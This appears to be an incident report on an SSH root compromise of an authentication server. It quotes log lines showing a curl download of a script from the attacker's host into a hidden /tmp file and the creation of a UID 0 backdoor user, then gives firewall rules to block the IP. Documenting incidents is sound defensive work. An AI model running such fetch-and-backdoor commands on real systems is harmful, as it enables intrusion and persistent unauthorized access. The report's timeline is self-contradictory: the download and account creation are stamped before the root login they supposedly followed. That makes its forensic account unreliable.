# Incident Report: Unauthorized Access and System Compromise

## Summary
On 2026-11-05, the authentication server `srv-auth-01` suffered a critical security breach originating from IP address `198.51.100.77`. The attacker successfully compromised the `root` account via SSH password authentication, proceeded to download a malicious payload, and established persistence by creating a privileged backdoor user account with UID/GID 0.

## Evidence
- **Successful Brute-Force/Credential Compromise:**
  - `2026-11-05 01:12:00 srv-auth-01 sshd[7100]: Accepted password for root from 198.51.100.77 port 41031 ssh2`
- **Privilege Use & Execution:**
  - `2026-11-05 01:07:36 srv-auth-01 sudo: root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x`
- **Persistence Mechanism Creation:**
  - `2026-11-05 01:10:46 srv-auth-01 useradd[7120]: new user: name=svc-backup, UID=0, GID=0, home=/root, shell=/bin/bash`

## Attacker
- **IP Address:** `198.51.100.77`

## Post-Exploitation Activity
1. **Payload Retrieval:** Downloaded an external script from the attacker's server (`http://198.51.100.77/x.sh`) and saved it to `/tmp/.x`.
2. **Backdoor Account Creation:** Created a rogue privileged user `svc-backup` assigned with root privileges (`UID=0`, `GID=0`) and `/bin/bash` shell to maintain persistent access.

## Firewall Commands
To immediately block the attacker IP at the network boundary/host firewall, run:

\`\`\`bash
# For iptables-based systems
iptables -A INPUT -s 198.51.100.77 -j DROP

# For UFW-based systems
ufw deny from 198.51.100.77 to any
\`\`\`
